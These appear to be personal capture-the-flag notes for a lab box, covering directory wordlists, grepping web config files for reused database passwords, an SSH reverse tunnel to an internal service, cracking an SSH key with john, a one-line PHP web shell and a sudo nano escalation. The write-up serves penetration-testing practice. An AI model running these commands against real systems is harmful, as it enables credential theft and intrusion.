### Foothold
not sure `/usr/share/wordlists/wfuzz/general/big.txt` is diff from `/usr/share/seclists/Discovery/Web-Content/big.txt` or not.
But `autorecon` didn't trigger any of them anyway.

Another important one here `/usr/share/wordlists/dirbuster/directory-list-1.0.txt`

Also, pay more attention to 'Create' or 'Login' functions when doing a happy path.

### Pivoting
##### jimmy
When there is a web server. Looking for database credentials would be a good start. Like MySQL.
Eyes on something like 'Config' or 'Local'. from '/var/www/...' perhaps.

And the database name could be googled with the webserver.
Like google opennetadmin (connect) database
https://opennetadmin.com/forum_archive/4/t-85.html

``` 
cat local/config/database_settings.inc.php | grep -i "pass" # Try it and seems password got reused
```

##### joanna aka the hard/interesting part
1. Enumerating from www-data found that a directory `/var/www/internal` belong to jimmy only or simply `find / -user jimmy 2>/dev/null`
2. (Optional) Crack the hash from `index.php` 
3. Find the port that running this service. There are a couple of ways.
```
netstat -tl

netstat -tulpn

netstat -ano | grep tcp

netstat -naep | grep LISTEN | grep -v LISTENING

cat /etc/apache2/sites-enabled/internal.conf
```
4. Without the hash
```
curl -s localhost:52846/main.php
```
5. Using the hash
```
curl -d "username=jimmy&password=Revealed" -X POST http://localhost:52846/main.php
```
or Pivoting through SSH port forwarding.
```
ssh -R 1337:127.0.0.1:52846 kali@targetIP
```
The command above creates a remote SSH tunnel, which forwards all connections from port 1337 on our host to port 52846 on the box. Make sure that the SSH server is running and permits root login(not sure normal kali user works or not). The application can now be accessed by browsing to 
http://127.0.0.1:1337

6. Use the private key
```
/usr/share/john/ssh2john.py key > hash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh hash
# Bonus
cat /usr/share/wordlists/rockyou.txt | grep ninja >> better.txt
```

7. Bonus with the RCE on the 52846 running server
```
echo '<?php echo exec("id");?' > shell.php
curl http://localhost:52846/shell.php
```

### Priv
```
sudo -l
sudo /bin/nano /opt/priv
gtf
```
